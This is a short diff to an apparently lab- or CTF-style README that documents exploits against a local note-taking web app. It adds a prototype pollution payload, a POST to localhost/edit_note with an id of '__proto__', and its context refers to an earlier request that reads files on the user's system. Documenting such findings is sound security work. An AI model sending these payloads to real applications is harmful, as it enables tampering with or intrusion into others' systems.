@@ -28,4 +28,17 @@ To make the following requests, I build HTTP Requests using Powershell's Invoke-
    ```
    This example specifically hits this README, but you can use this to access further files on the user's system.
 
-2. d
+2. Prototype Pollution Exploit:
+
+ ```
+ POST: http://localhost/edit_note
+ 
+ Body, JSON Format:
+ {
+		"id": "__proto__",
+		"author": "{}",
+		"raw": "{}"
+}
+ ```
+
+3. 
